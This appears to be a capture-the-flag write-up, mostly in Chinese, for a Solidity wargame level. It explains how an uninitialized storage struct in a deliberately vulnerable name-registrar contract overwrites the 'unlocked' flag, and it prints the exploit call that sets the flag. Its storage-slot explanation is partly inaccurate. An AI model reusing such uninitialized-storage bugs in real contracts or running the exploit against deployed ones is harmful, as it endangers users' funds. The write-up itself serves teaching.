## 0x01 Task

```javascript
pragma solidity ^0.4.23; 

// A Locked Name Registrar
contract Locked {

    bool public unlocked = false;  // registrar locked, no name updates
    
    struct NameRecord { // map hashes to addresses
        bytes32 name; // 
        address mappedAddress;
    }

    mapping(address => NameRecord) public registeredNameRecord; // records who registered names 
    mapping(bytes32 => address) public resolve; // resolves hashes to addresses
    
    function register(bytes32 _name, address _mappedAddress) public {
        // set up the new NameRecord
        NameRecord newRecord;
        newRecord.name = _name;
        newRecord.mappedAddress = _mappedAddress; 

        resolve[_name] = _mappedAddress;
        registeredNameRecord[msg.sender] = newRecord; 

        require(unlocked); // only allow registrations if contract is unlocked
    }
}
```

This name registrar is locked and will not accept any new names to be registered.

Unlock this registrar to beat the level.

## 0x02 need2know

题目里多了一个`structs`，可以把它当做结构体来想。

看一下`structs`在Solidity里面有哪些需要注意的地方：

### 初始化结构体

现在我有这样的结构

```javascript
struct Funder {
    address addr;
    uint amount;
}

struct StructOfStructs {
    ...
    mapping (uint => Funder) funders;
}
```

- 直接传值初始化

`... = Funder(msg.sender, msg.value);`

- 使用对象传值（更好的阅读体验）

`... = Funder({addr: msg.sender, amount: msg.value})`

### 结构体数组

```javascript
Funders[] public funders;
function ... {
    Funder memory f;
    f.address = ...;
    f.amount = ...;
    funders.push(f);
}
```

需要知道的一点是：声明结构体是用来存储的。当使用创建或复制结构体的时候，需要使用`memory`修饰符。在函数中的任何临时计算都不应当使用结构体。

### 结构体映射

```javascript
mapping (uint => Funder) funders; 
function ... {
    funders[index] = Funder(...);
}
```

### 错误的使用方法

```javascript
// Do NOT do this
function badFunction{
    Funder f;         //this defaults to storage
    f.address = ...;
    f.amount = ...;
    funders.push(f);  //this will fail
}
```

```javascript
// Do NOT do this
function badFunction{
    Funder storage f = Funder(...);
}
// Do NOT do this
function badFunction(Funder _funder){
    Funder storage f = _funder;
}
```

Notice that function input parameters are also memory, not storage reference pointers.

## 0x03 Solution

任务目标是把全局变量`unlocked`改为`true`

看一下变量的存储结构：

```javascript
bool public unlocked = false;  // registrar locked, no name updates
struct NameRecord { // map hashes to addresses
    bytes32 name; // 
    address mappedAddress;
}
```
因为`name`是`bytes32`的，所以`unlock`实际上占据了整个slot1。

`false`的字节码是`0x00`，所以`unlock`在合约中的存储看起来就像这样：

```
0x0000000000000000000000000000000000000000000000000000000000000000
```

然后在`register`函数中：

```javascript
function register(bytes32 _name, address _mappedAddress) public {
        // set up the new NameRecord
        NameRecord newRecord;
        newRecord.name = _name;
        newRecord.mappedAddress = _mappedAddress; 
```

这里就犯了刚才提到的错误。

`newRecord` defaults to storage! And any data saved inside newRecord will overwrite the existing slots 1 and 2 in storage.

所以就很轻松地可以修改`unlocked`

```javascript
await contract.register("0x0000000000000000000000000000000000000000000000000000000000000001","0x899f879df02dc33893c54d6D02A3b2D6bBE144Df")
```

查看解锁情况：

```javascript
await contract.unlocked();
```

